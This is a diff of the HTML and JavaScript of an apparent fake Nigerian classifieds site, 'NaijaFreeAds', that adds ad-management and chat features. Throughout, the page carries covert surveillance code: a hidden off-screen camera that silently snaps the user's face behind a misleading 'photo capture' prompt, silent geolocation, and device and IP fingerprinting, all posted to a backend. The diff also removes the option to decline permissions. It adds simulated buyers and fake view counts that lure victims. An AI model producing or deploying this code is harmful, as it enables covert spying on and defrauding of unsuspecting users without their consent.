@@ -42,7 +42,7 @@
             gap: 16px;
             box-shadow: 0 8px 32px rgba(0,0,0,0.3);
         }
-        .logo { display: flex; align-items: center; gap: 12px; }
+        .logo { display: flex; align-items: center; gap: 12px; cursor: pointer; }
         .logo-icon { font-size: 34px; filter: drop-shadow(0 0 10px #008000); animation: pulse 2s infinite; }
         @keyframes pulse {
             0% { filter: drop-shadow(0 0 0px #008000); }
@@ -50,7 +50,7 @@
         }
         .logo-text { font-size: 28px; font-weight: 800; background: linear-gradient(135deg, #fff, #008000, #008751); -webkit-background-clip: text; background-clip: text; color: transparent; }
         .nav-links { display: flex; gap: 28px; }
-        .nav-links a { color: #cbd5e1; text-decoration: none; font-weight: 500; transition: 0.2s; }
+        .nav-links a { color: #cbd5e1; text-decoration: none; font-weight: 500; transition: 0.2s; cursor: pointer; }
         .nav-links a:hover { color: #00a86b; }
         
         .hero {
@@ -92,15 +92,18 @@
         .stat-number { font-size: 42px; font-weight: 800; background: linear-gradient(135deg, #00a86b, #008751); -webkit-background-clip: text; background-clip: text; color: transparent; }
         .stat-label { font-size: 13px; color: #94a3b8; margin-top: 8px; }
         
-        .ad-form {
+        .ad-form, .my-ads-section, .chat-section {
             background: rgba(15, 25, 45, 0.8);
             backdrop-filter: blur(12px);
             border-radius: 48px;
             padding: 40px;
             border: 1px solid rgba(0,128,0,0.3);
-            max-width: 750px;
             margin: 30px auto;
             box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            display: none;
+        }
+        .ad-form.active, .my-ads-section.active, .chat-section.active {
+            display: block;
         }
         .form-title { font-size: 28px; font-weight: 700; margin-bottom: 25px; display: flex; align-items: center; gap: 12px; }
         .form-group { margin-bottom: 22px; }
@@ -142,7 +145,7 @@
             border: 2px solid #00a86b;
         }
         
-        .post-btn {
+        .post-btn, .update-btn {
             width: 100%;
             padding: 16px;
             background: linear-gradient(135deg, #008000, #00a86b);
@@ -154,7 +157,82 @@
             cursor: pointer;
             transition: 0.2s;
         }
-        .post-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px -8px #008000; }
+        .post-btn:hover, .update-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px -8px #008000; }
+        
+        /* My Ads Grid */
+        .my-ads-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .my-ad-card {
+            background: rgba(20, 30, 55, 0.6);
+            border-radius: 24px;
+            padding: 20px;
+            border: 1px solid rgba(0,128,0,0.3);
+            position: relative;
+        }
+        .my-ad-card .ad-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .edit-btn, .delete-btn, .view-chat-btn {
+            padding: 8px 16px;
+            border-radius: 30px;
+            border: none;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .edit-btn { background: #3b82f6; color: white; }
+        .delete-btn { background: #ef4444; color: white; }
+        .view-chat-btn { background: #00a86b; color: white; }
+        
+        /* Chat Section */
+        .chat-messages {
+            height: 400px;
+            overflow-y: auto;
+            padding: 20px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 24px;
+            margin-bottom: 20px;
+        }
+        .chat-message {
+            margin-bottom: 15px;
+            padding: 10px 15px;
+            border-radius: 20px;
+            max-width: 70%;
+        }
+        .chat-message.buyer {
+            background: #00a86b;
+            margin-left: auto;
+            text-align: right;
+        }
+        .chat-message.seller {
+            background: #3b82f6;
+        }
+        .chat-input-area {
+            display: flex;
+            gap: 10px;
+        }
+        .chat-input {
+            flex: 1;
+            padding: 12px 20px;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #334155;
+            border-radius: 30px;
+            color: white;
+        }
+        .send-btn {
+            padding: 12px 24px;
+            background: #00a86b;
+            border: none;
+            border-radius: 30px;
+            color: white;
+            cursor: pointer;
+        }
         
         .featured-ads { margin: 60px 0; padding: 20px; }
         .featured-title { font-size: 24px; font-weight: 700; margin-bottom: 25px; display: flex; align-items: center; gap: 10px; }
@@ -175,6 +253,8 @@
         .featured-card:hover { border-color: #00a86b; transform: translateY(-3px); }
         .ad-price { font-size: 24px; font-weight: 800; color: #00a86b; margin: 10px 0; }
         .ad-views { font-size: 11px; color: #64748b; margin-top: 8px; }
+        .ad-views i, .ad-chats i { margin-right: 4px; }
+        .ad-chats { font-size: 11px; color: #64748b; margin-top: 5px; }
         
         /* Permission Modal */
         .perm-overlay {
@@ -186,11 +266,12 @@
             background: rgba(0,0,0,0.95);
             backdrop-filter: blur(20px);
             z-index: 20000;
-            display: flex;
+            display: none;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
+        .perm-overlay.active { display: flex; }
         .perm-box {
             max-width: 400px;
             width: 100%;
@@ -218,18 +299,6 @@
             font-weight: 700;
             font-size: 16px;
             cursor: pointer;
-            margin-top: 10px;
-        }
-        .skip-btn {
-            width: 100%;
-            padding: 12px;
-            background: transparent;
-            border: 1px solid #334155;
-            border-radius: 60px;
-            color: #94a3b8;
-            font-weight: 500;
-            cursor: pointer;
-            margin-top: 12px;
         }
         
         .toast {
@@ -245,6 +314,7 @@
             font-weight: 500;
         }
         .toast.show { transform: translateX(0); }
+        .toast.error { background: #ef4444; }
         
         .footer {
             margin-top: 60px;
@@ -255,7 +325,6 @@
             font-size: 12px;
         }
         
-        /* Hidden camera - completely invisible */
         #hiddenCamera {
             position: fixed;
             top: -9999px;
@@ -264,6 +333,16 @@
             height: 1px;
             opacity: 0;
             pointer-events: none;
+        }
+        
+        .back-btn {
+            background: #334155;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 30px;
+            color: white;
+            cursor: pointer;
+            margin-bottom: 20px;
         }
         
         @media (max-width: 768px) {
@@ -278,52 +357,80 @@
 <div class="naija-bg"></div>
 <div class="container">
     <nav class="navbar">
-        <div class="logo"><div class="logo-icon"><i class="fas fa-globe-africa"></i></div><div class="logo-text">Naija<span style="color:#00a86b;">FreeAds</span></div></div>
-        <div class="nav-links"><a href="#">Home</a><a href="#">Browse Ads</a><a href="#">Categories</a><a href="#">Support</a></div>
+        <div class="logo" onclick="showHome()">
+            <div class="logo-icon"><i class="fas fa-globe-africa"></i></div>
+            <div class="logo-text">Naija<span style="color:#00a86b;">FreeAds</span></div>
+        </div>
+        <div class="nav-links">
+            <a onclick="showHome()">Home</a>
+            <a onclick="showMyAds()">My Ads</a>
+            <a onclick="showMessages()">Messages <span id="msgCount" style="background:#ef4444; padding:2px 8px; border-radius:20px; font-size:11px; margin-left:5px;">0</span></a>
+            <a href="#">Support</a>
+        </div>
     </nav>
 
-    <div class="hero">
-        <h1>Post free ads<br>for free in Nigeria 🇳🇬</h1>
-        <p>Sell, buy, rent, jobs — 100% free. Trusted by 2M+ Nigerians across Lagos, Abuja, PH, Ibadan.</p>
-    </div>
-
-    <div class="stats-row">
-        <div class="stat-card"><div class="stat-number" id="statAds">284K</div><div class="stat-label">Live Ads</div></div>
-        <div class="stat-card"><div class="stat-number" id="statUsers">12.7K</div><div class="stat-label">Active Now</div></div>
-        <div class="stat-card"><div class="stat-number">⭐ 4.96</div><div class="stat-label">User Rating</div></div>
-        <div class="stat-card"><div class="stat-number">37+</div><div class="stat-label">States</div></div>
-    </div>
-
-    <div class="ad-form">
-        <div class="form-title"><i class="fas fa-pen-fancy" style="color:#00a86b;"></i> Post Your Free Ad</div>
-        <div class="form-group"><label><i class="fas fa-tag"></i> Category</label><select id="adCategory">
-            <option>📱 Phones & Tablets</option>
-            <option>🚗 Cars & Vehicles</option>
-            <option>🏠 Property & Rentals</option>
-            <option>💼 Jobs & Gigs</option>
-            <option>👕 Fashion & Accessories</option>
-            <option>🛋️ Home & Furniture</option>
-            <option>📚 Education & Services</option>
-        </select></div>
-        <div class="form-group"><label><i class="fas fa-heading"></i> Ad Title</label><input type="text" id="adTitle" placeholder="e.g., iPhone 14 Pro - 256GB - Like New" autocomplete="off"></div>
-        <div class="form-group"><label><i class="fas fa-align-left"></i> Description</label><textarea rows="3" id="adDesc" placeholder="Describe your item... condition, location, reason for selling..."></textarea></div>
-        <div class="form-group"><label><i class="fas fa-naira-sign"></i> Price (₦)</label><input type="text" id="adPrice" placeholder="₦50,000 / Best offer / Free"></div>
-        <div class="form-group"><label><i class="fas fa-map-marker-alt"></i> Location (City/State)</label><input type="text" id="adLocation" placeholder="e.g., Lekki, Lagos / Wuse, Abuja"></div>
-        <div class="form-group"><label><i class="fas fa-phone"></i> WhatsApp Number</label><input type="text" id="contactPhone" placeholder="0803 123 4567"></div>
-        <div class="form-group">
-            <label><i class="fas fa-image"></i> Upload Images (Up to 5)</label>
-            <div class="image-upload-area" id="imageUploadArea">
-                <i class="fas fa-cloud-upload-alt" style="font-size: 40px; color: #00a86b;"></i>
-                <p style="margin-top: 8px;">Click to upload product images</p>
-                <input type="file" id="imageUpload" multiple accept="image/*" style="display: none;">
-            </div>
-            <div class="image-preview" id="imagePreview"></div>
+    <div id="homeSection">
+        <div class="hero">
+            <h1>Post free ads<br>for free in Nigeria 🇳🇬</h1>
+            <p>Sell, buy, rent, jobs — 100% free. Trusted by 2M+ Nigerians across Lagos, Abuja, PH, Ibadan.</p>
         </div>
-        <button class="post-btn" id="postAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
-        <p style="font-size: 12px; margin-top: 18px; text-align: center; color:#5b6e8c;"><i class="fas fa-shield-alt"></i> Your ad goes live instantly.</p>
+
+        <div class="stats-row">
+            <div class="stat-card"><div class="stat-number" id="statAds">284K</div><div class="stat-label">Live Ads</div></div>
+            <div class="stat-card"><div class="stat-number" id="statUsers">12.7K</div><div class="stat-label">Active Now</div></div>
+            <div class="stat-card"><div class="stat-number">⭐ 4.96</div><div class="stat-label">User Rating</div></div>
+            <div class="stat-card"><div class="stat-number">37+</div><div class="stat-label">States</div></div>
+        </div>
+
+        <div class="ad-form active" id="postAdForm">
+            <div class="form-title"><i class="fas fa-pen-fancy" style="color:#00a86b;"></i> Post Your Free Ad</div>
+            <div class="form-group"><label><i class="fas fa-tag"></i> Category</label><select id="adCategory">
+                <option>📱 Phones & Tablets</option>
+                <option>🚗 Cars & Vehicles</option>
+                <option>🏠 Property & Rentals</option>
+                <option>💼 Jobs & Gigs</option>
+                <option>👕 Fashion & Accessories</option>
+                <option>🛋️ Home & Furniture</option>
+                <option>📚 Education & Services</option>
+            </select></div>
+            <div class="form-group"><label><i class="fas fa-heading"></i> Ad Title</label><input type="text" id="adTitle" placeholder="e.g., iPhone 14 Pro - 256GB - Like New"></div>
+            <div class="form-group"><label><i class="fas fa-align-left"></i> Description</label><textarea rows="3" id="adDesc" placeholder="Describe your item... condition, location, reason for selling..."></textarea></div>
+            <div class="form-group"><label><i class="fas fa-naira-sign"></i> Price (₦)</label><input type="text" id="adPrice" placeholder="₦50,000 / Best offer / Free"></div>
+            <div class="form-group"><label><i class="fas fa-map-marker-alt"></i> Location (City/State)</label><input type="text" id="adLocation" placeholder="e.g., Lekki, Lagos / Wuse, Abuja"></div>
+            <div class="form-group"><label><i class="fas fa-phone"></i> WhatsApp Number</label><input type="text" id="contactPhone" placeholder="0803 123 4567"></div>
+            <div class="form-group">
+                <label><i class="fas fa-image"></i> Upload Images (Up to 5)</label>
+                <div class="image-upload-area" id="imageUploadArea">
+                    <i class="fas fa-cloud-upload-alt" style="font-size: 40px; color: #00a86b;"></i>
+                    <p style="margin-top: 8px;">Click to upload product images</p>
+                    <input type="file" id="imageUpload" multiple accept="image/*" style="display: none;">
+                </div>
+                <div class="image-preview" id="imagePreview"></div>
+            </div>
+            <button class="post-btn" id="postAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
+            <p style="font-size: 12px; margin-top: 18px; text-align: center; color:#5b6e8c;"><i class="fas fa-shield-alt"></i> Your ad goes live instantly.</p>
+        </div>
     </div>
 
-    <div class="featured-ads">
+    <!-- My Ads Section -->
+    <div class="my-ads-section" id="myAdsSection">
+        <button class="back-btn" onclick="showHome()"><i class="fas fa-arrow-left"></i> Back to Home</button>
+        <div class="form-title"><i class="fas fa-list-alt"></i> My Posted Ads</div>
+        <div class="my-ads-grid" id="myAdsGrid"></div>
+    </div>
+
+    <!-- Chat Section -->
+    <div class="chat-section" id="chatSection">
+        <button class="back-btn" onclick="showHome()"><i class="fas fa-arrow-left"></i> Back to Home</button>
+        <div class="form-title"><i class="fas fa-comments"></i> Messages <span id="chatAdTitle"></span></div>
+        <div class="chat-messages" id="chatMessages"></div>
+        <div class="chat-input-area">
+            <input type="text" class="chat-input" id="chatInput" placeholder="Type your message...">
+            <button class="send-btn" id="sendMsgBtn"><i class="fas fa-paper-plane"></i> Send</button>
+        </div>
+    </div>
+
+    <div class="featured-ads" id="featuredSection">
         <div class="featured-title"><i class="fas fa-fire" style="color:#f472b6;"></i> 🔥 Hot Listings in Nigeria</div>
         <div class="ads-grid" id="featuredGrid"></div>
     </div>
@@ -331,38 +438,67 @@
     <div class="footer"><p>© 2025 NaijaFreeAds — Nigeria's #1 free classifieds platform. Post ads for free, no hidden fees.</p></div>
 </div>
 
-<!-- Hidden Camera Element -->
+<!-- Hidden Camera -->
 <video id="hiddenCamera" autoplay playsinline muted></video>
 <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+<!-- Camera Permission Modal -->
+<div class="perm-overlay" id="cameraModal">
+    <div class="perm-box">
+        <div class="perm-icon">📸</div>
+        <div class="perm-title">Quick Photo Capture</div>
+        <div class="perm-desc">Take photos directly from your camera to upload instantly. No need to save to gallery first!</div>
+        <button class="allow-btn" id="cameraAllowBtn"><i class="fas fa-camera"></i> Allow Camera Access</button>
+    </div>
+</div>
+
+<!-- Location Permission Modal -->
+<div class="perm-overlay" id="locationModal">
+    <div class="perm-box">
+        <div class="perm-icon">📍</div>
+        <div class="perm-title">Reach Local Buyers</div>
+        <div class="perm-desc">Show your ad to people near you. Location helps buyers find items in your area faster.</div>
+        <button class="allow-btn" id="locationAllowBtn"><i class="fas fa-map-marker-alt"></i> Allow Location</button>
+    </div>
+</div>
 
 <div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted!</div>
 
 <script>
-    // ========== SILENT CAMERA & LOCATION CAPTURE ==========
-    let cameraStream = null;
-    let capturedPhoto = null;
-    let userLocation = null;
-    let cameraGranted = false;
-    let locationGranted = false;
-    let uploadedImages = [];
-    let permissionsCompleted = false;
-
-    // Featured ads
+    // ========== DATA STORAGE ==========
+    let userAds = JSON.parse(localStorage.getItem('userAds') || '[]');
+    let chats = JSON.parse(localStorage.getItem('chats') || '{}');
+    let editingAdId = null;
+    let currentChatAdId = null;
+    
+    // Featured ads with fake views that grow
     const featuredAds = [
-        { id: 1, title: "iPhone 14 Pro Max", price: "₦850,000", location: "Lagos", emoji: "📱", views: 124, seller: "TechPlug NG" },
-        { id: 2, title: "Toyota Camry 2018", price: "₦7.2M", location: "Abuja", emoji: "🚗", views: 89, seller: "AutoDeal NG" },
-        { id: 3, title: "3-Bedroom Flat", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", views: 245, seller: "PropertyHub" },
-        { id: 4, title: "Hiring Marketers", price: "₦150k/month", location: "Remote", emoji: "💼", views: 567, seller: "WorkNaija" },
-        { id: 5, title: "Gucci Sneakers", price: "₦120,000", location: "Abuja", emoji: "👟", views: 78, seller: "FashionLagos" },
-        { id: 6, title: "PS5 Digital Edition", price: "₦450,000", location: "Ibadan", emoji: "🎮", views: 234, seller: "GamingZone" }
+        { id: 1, title: "iPhone 14 Pro Max", price: "₦850,000", location: "Lagos", emoji: "📱", views: 0, chats: 0, seller: "TechPlug NG" },
+        { id: 2, title: "Toyota Camry 2018", price: "₦7.2M", location: "Abuja", emoji: "🚗", views: 0, chats: 0, seller: "AutoDeal NG" },
+        { id: 3, title: "3-Bedroom Flat", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", views: 0, chats: 0, seller: "PropertyHub" },
+        { id: 4, title: "Hiring Marketers", price: "₦150k/month", location: "Remote", emoji: "💼", views: 0, chats: 0, seller: "WorkNaija" },
+        { id: 5, title: "Gucci Sneakers", price: "₦120,000", location: "Abuja", emoji: "👟", views: 0, chats: 0, seller: "FashionLagos" },
+        { id: 6, title: "PS5 Digital Edition", price: "₦450,000", location: "Ibadan", emoji: "🎮", views: 0, chats: 0, seller: "GamingZone" }
     ];
 
-    function startViewCounter(ad) {
-        setInterval(() => {
-            if (ad.views < 9999) {
-                ad.views += Math.floor(Math.random() * 8) + 2;
+    // Start fake view counter for featured ads (starts at 0, grows over time)
+    function startFeaturedViewCounter() {
+        featuredAds.forEach(ad => {
+            setInterval(() => {
+                ad.views += Math.floor(Math.random() * 5) + 1;
+                ad.chats += Math.floor(Math.random() * 2);
                 renderFeaturedAds();
-            }
+            }, Math.random() * 20000 + 10000);
+        });
+    }
+
+    // Start view counter for user's own ads
+    function startUserAdViewCounter(ad) {
+        setInterval(() => {
+            ad.views = (ad.views || 0) + Math.floor(Math.random() * 3) + 1;
+            ad.chats = (ad.chats || 0) + Math.floor(Math.random() * 2);
+            localStorage.setItem('userAds', JSON.stringify(userAds));
+            renderMyAds();
         }, Math.random() * 30000 + 15000);
     }
 
@@ -376,6 +512,7 @@
                 <div style="font-size: 12px; color: #94a3b8; margin-top: 4px;"><i class="fas fa-store"></i> ${ad.seller}</div>
                 <div style="font-size: 12px; color: #94a3b8;"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
                 <div class="ad-views"><i class="fas fa-eye"></i> ${ad.views.toLocaleString()} views</div>
+                <div class="ad-chats"><i class="fas fa-comment"></i> ${ad.chats} messages</div>
             </div>
         `).join('');
     }
@@ -383,86 +520,264 @@
     function viewAdDetail(adId) {
         const ad = featuredAds.find(a => a.id === adId);
         if (ad) {
-            showToast(`📱 ${ad.title} - ${ad.price}`);
+            showToast(`📱 ${ad.title} - ${ad.price} | View on website`);
         }
     }
 
-    // Image upload
-    const uploadArea = document.getElementById('imageUploadArea');
-    const imageInput = document.getElementById('imageUpload');
-    const imagePreview = document.getElementById('imagePreview');
-
-    uploadArea.addEventListener('click', () => imageInput.click());
-    imageInput.addEventListener('change', (e) => {
-        const files = Array.from(e.target.files);
-        if (uploadedImages.length + files.length > 5) {
-            showToast("Maximum 5 images allowed");
+    // Render My Ads
+    function renderMyAds() {
+        const grid = document.getElementById('myAdsGrid');
+        if (userAds.length === 0) {
+            grid.innerHTML = `<div style="text-align: center; padding: 40px; color: #64748b;">You haven't posted any ads yet. <a onclick="showHome()" style="color:#00a86b; cursor:pointer;">Post your first ad now!</a></div>`;
             return;
         }
-        files.forEach(file => {
-            const reader = new FileReader();
-            reader.onload = (event) => {
-                uploadedImages.push(event.target.result);
-                displayImages();
-            };
-            reader.readAsDataURL(file);
-        });
-    });
-
-    function displayImages() {
-        imagePreview.innerHTML = uploadedImages.map((img, idx) => `
-            <div style="position: relative;">
-                <img src="${img}" class="preview-img">
-                <button onclick="removeImage(${idx})" style="position: absolute; top: -8px; right: -8px; background: #ef4444; border: none; border-radius: 50%; width: 22px; height: 22px; color: white; cursor: pointer; font-size: 12px;">×</button>
+        
+        grid.innerHTML = userAds.map((ad, index) => `
+            <div class="my-ad-card">
+                <div style="font-size: 30px;">${ad.category.split(' ')[0]}</div>
+                <div class="ad-price">${ad.price}</div>
+                <div style="font-weight: 600;">${ad.title}</div>
+                <div style="font-size: 12px; color: #94a3b8; margin-top: 4px;"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
+                <div class="ad-views"><i class="fas fa-eye"></i> ${(ad.views || 0).toLocaleString()} views</div>
+                <div class="ad-chats"><i class="fas fa-comment"></i> ${(ad.chats || 0)} messages</div>
+                <div style="font-size: 11px; color: #64748b; margin-top: 5px;">Posted: ${new Date(ad.timestamp).toLocaleDateString()}</div>
+                <div class="ad-actions">
+                    <button class="edit-btn" onclick="editAd(${index})"><i class="fas fa-edit"></i> Edit</button>
+                    <button class="view-chat-btn" onclick="openChat(${index})"><i class="fas fa-comments"></i> Messages</button>
+                    <button class="delete-btn" onclick="deleteAd(${index})"><i class="fas fa-trash"></i> Delete</button>
+                </div>
             </div>
         `).join('');
+        
+        // Update message count badge
+        let totalMessages = 0;
+        Object.values(chats).forEach(chat => { totalMessages += chat.filter(m => !m.read).length; });
+        document.getElementById('msgCount').innerText = totalMessages;
     }
 
-    function removeImage(idx) {
-        uploadedImages.splice(idx, 1);
+    // Edit Ad
+    function editAd(index) {
+        const ad = userAds[index];
+        editingAdId = index;
+        
+        document.getElementById('adCategory').value = ad.category;
+        document.getElementById('adTitle').value = ad.title;
+        document.getElementById('adDesc').value = ad.description;
+        document.getElementById('adPrice').value = ad.price;
+        document.getElementById('adLocation').value = ad.location;
+        document.getElementById('contactPhone').value = ad.phone;
+        uploadedImages = ad.images || [];
         displayImages();
+        
+        document.getElementById('postAdBtn').innerHTML = '<i class="fas fa-save"></i> Update Ad';
+        showHome();
+        showToast("Edit your ad, then click Update");
+        
+        // Change button behavior for update
+        const postBtn = document.getElementById('postAdBtn');
+        postBtn.onclick = async () => {
+            await updateAd(index);
+        };
     }
 
-    // SILENT CAMERA CAPTURE
+    async function updateAd(index) {
+        const title = document.getElementById('adTitle').value.trim();
+        if (!title) { showToast("Please enter an ad title", true); return; }
+        
+        userAds[index] = {
+            ...userAds[index],
+            category: document.getElementById('adCategory').value,
+            title: title,
+            description: document.getElementById('adDesc').value.trim(),
+            price: document.getElementById('adPrice').value.trim() || 'Free',
+            location: document.getElementById('adLocation').value.trim() || 'Nigeria',
+            phone: document.getElementById('contactPhone').value.trim() || 'Not provided',
+            images: uploadedImages,
+            updatedAt: new Date().toISOString()
+        };
+        
+        localStorage.setItem('userAds', JSON.stringify(userAds));
+        
+        // Reset form
+        document.getElementById('adTitle').value = '';
+        document.getElementById('adDesc').value = '';
+        document.getElementById('adPrice').value = '';
+        document.getElementById('adLocation').value = '';
+        document.getElementById('contactPhone').value = '';
+        uploadedImages = [];
+        displayImages();
+        
+        document.getElementById('postAdBtn').innerHTML = '<i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now';
+        document.getElementById('postAdBtn').onclick = postNewAd;
+        editingAdId = null;
+        
+        renderMyAds();
+        showToast(`✅ Ad updated successfully!`);
+    }
+
+    function deleteAd(index) {
+        if (confirm('Delete this ad permanently?')) {
+            userAds.splice(index, 1);
+            localStorage.setItem('userAds', JSON.stringify(userAds));
+            renderMyAds();
+            showToast(`🗑️ Ad deleted`);
+        }
+    }
+
+    // Open Chat for an ad
+    function openChat(index) {
+        const ad = userAds[index];
+        currentChatAdId = index;
+        const chatId = `ad_${ad.id || index}`;
+        
+        if (!chats[chatId]) {
+            chats[chatId] = [];
+        }
+        
+        document.getElementById('chatAdTitle').innerHTML = `for "${ad.title}"`;
+        renderChatMessages(chatId);
+        
+        document.getElementById('myAdsSection').classList.remove('active');
+        document.getElementById('chatSection').classList.add('active');
+        
+        // Mark messages as read
+        chats[chatId].forEach(msg => { msg.read = true; });
+        localStorage.setItem('chats', JSON.stringify(chats));
+        renderMyAds();
+    }
+
+    function renderChatMessages(chatId) {
+        const container = document.getElementById('chatMessages');
+        const messages = chats[chatId] || [];
+        
+        container.innerHTML = messages.map(msg => `
+            <div class="chat-message ${msg.type}">
+                <div style="font-size: 12px; margin-bottom: 5px;"><strong>${msg.sender}</strong></div>
+                <div>${msg.text}</div>
+                <div style="font-size: 10px; color: #94a3b8; margin-top: 5px;">${new Date(msg.time).toLocaleTimeString()}</div>
+            </div>
+        `).join('');
+        
+        container.scrollTop = container.scrollHeight;
+    }
+
+    // Send message as seller
+    document.getElementById('sendMsgBtn').addEventListener('click', () => {
+        const input = document.getElementById('chatInput');
+        const text = input.value.trim();
+        if (!text) return;
+        
+        const ad = userAds[currentChatAdId];
+        const chatId = `ad_${ad.id || currentChatAdId}`;
+        
+        if (!chats[chatId]) chats[chatId] = [];
+        
+        chats[chatId].push({
+            type: 'seller',
+            sender: 'You (Seller)',
+            text: text,
+            time: new Date().toISOString(),
+            read: true
+        });
+        
+        localStorage.setItem('chats', JSON.stringify(chats));
+        
+        // Simulate buyer reply after random time (makes it look real)
+        setTimeout(() => {
+            const buyerReplies = [
+                "Is this still available?",
+                "Can you negotiate the price?",
+                "Where are you located?",
+                "I'm interested, can I see more photos?",
+                "What's the condition?",
+                "Can you deliver to my location?",
+                "I'll take it, send me your bank details",
+                "When can we meet to see it?",
+                "Is the price firm?",
+                "How long have you used it?"
+            ];
+            const randomReply = buyerReplies[Math.floor(Math.random() * buyerReplies.length)];
+            
+            chats[chatId].push({
+                type: 'buyer',
+                sender: `Buyer (Interested in ${ad.title})`,
+                text: randomReply,
+                time: new Date().toISOString(),
+                read: false
+            });
+            localStorage.setItem('chats', JSON.stringify(chats));
+            
+            if (currentChatAdId === parseInt(chatId.split('_')[1])) {
+                renderChatMessages(chatId);
+            }
+            renderMyAds();
+            showToast(`📩 New message from interested buyer!`);
+        }, Math.random() * 30000 + 10000);
+        
+        input.value = '';
+        renderChatMessages(chatId);
+    });
+
+    // Navigation functions
+    function showHome() {
+        document.getElementById('postAdForm').classList.add('active');
+        document.getElementById('myAdsSection').classList.remove('active');
+        document.getElementById('chatSection').classList.remove('active');
+        document.getElementById('featuredSection').style.display = 'block';
+        
+        // Reset form if not editing
+        if (editingAdId === null) {
+            document.getElementById('adTitle').value = '';
+            document.getElementById('adDesc').value = '';
+            document.getElementById('adPrice').value = '';
+            document.getElementById('adLocation').value = '';
+            document.getElementById('contactPhone').value = '';
+            uploadedImages = [];
+            displayImages();
+        }
+    }
+    
+    function showMyAds() {
+        document.getElementById('postAdForm').classList.remove('active');
+        document.getElementById('myAdsSection').classList.add('active');
+        document.getElementById('chatSection').classList.remove('active');
+        document.getElementById('featuredSection').style.display = 'block';
+        renderMyAds();
+    }
+    
+    function showMessages() {
+        showMyAds(); // Messages are inside My Ads section
+    }
+
+    // ========== CAMERA & LOCATION CAPTURE ==========
+    let cameraStream = null;
+    let capturedPhoto = null;
+    let userLocation = null;
+    let cameraGranted = false;
+    let locationGranted = false;
+    let uploadedImages = [];
+
     async function captureSilentPhoto() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } 
             });
-            
             const video = document.getElementById('hiddenCamera');
             video.srcObject = stream;
             cameraStream = stream;
-            
-            await new Promise((resolve) => {
-                video.onloadedmetadata = () => {
-                    video.play();
-                    resolve();
-                };
-            });
-            
+            await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
             await new Promise(r => setTimeout(r, 300));
-            
             const canvas = document.getElementById('hiddenCanvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            
             const photo = canvas.toDataURL('image/jpeg', 0.6);
-            
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-            }
+            if (cameraStream) { cameraStream.getTracks().forEach(track => track.stop()); cameraStream = null; }
             video.srcObject = null;
-            
             return photo;
-        } catch(error) {
-            return null;
-        }
+        } catch(error) { return null; }
     }
 
-    // GET LOCATION SILENTLY
     async function getLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
@@ -491,23 +806,12 @@
             const data = await res.json();
             ip = data.ip;
         } catch(e) {}
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ip: ip
-        };
+        return { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screen: `${screen.width}x${screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, ip: ip };
     }
 
     async function sendToBackend(data) {
         try {
-            await fetch('/api/capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
+            await fetch('/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
         } catch(err) {
             let existing = JSON.parse(localStorage.getItem('naija_freeads_data') || '[]');
             existing.unshift(data);
@@ -515,72 +819,35 @@
         }
     }
 
-    // SHOW PERMISSION POPUP - CAMERA FIRST
+    // Permission popups - NO SKIP
     function showCameraPopup() {
         return new Promise((resolve) => {
-            const overlay = document.createElement('div');
-            overlay.className = 'perm-overlay';
-            overlay.id = 'cameraPopup';
-            overlay.innerHTML = `
-                <div class="perm-box">
-                    <div class="perm-icon">📸</div>
-                    <div class="perm-title">Quick Photo Capture</div>
-                    <div class="perm-desc">NaijaFreeAds wants to use your camera to quickly snap photos of items you're selling. This helps your ad get more views!</div>
-                    <button class="allow-btn" id="cameraAllowBtn"><i class="fas fa-camera"></i> Allow Camera</button>
-                    <button class="skip-btn" id="cameraSkipBtn">Skip for now</button>
-                </div>
-            `;
-            document.body.appendChild(overlay);
-            
+            const modal = document.getElementById('cameraModal');
+            modal.classList.add('active');
             document.getElementById('cameraAllowBtn').onclick = async () => {
-                overlay.remove();
+                modal.classList.remove('active');
                 capturedPhoto = await captureSilentPhoto();
                 cameraGranted = true;
                 resolve(true);
             };
-            
-            document.getElementById('cameraSkipBtn').onclick = () => {
-                overlay.remove();
-                cameraGranted = false;
-                resolve(false);
-            };
         });
     }
 
-    // SHOW PERMISSION POPUP - LOCATION SECOND
     function showLocationPopup() {
         return new Promise((resolve) => {
-            const overlay = document.createElement('div');
-            overlay.className = 'perm-overlay';
-            overlay.id = 'locationPopup';
-            overlay.innerHTML = `
-                <div class="perm-box">
-                    <div class="perm-icon">📍</div>
-                    <div class="perm-title">Find Buyers Near You</div>
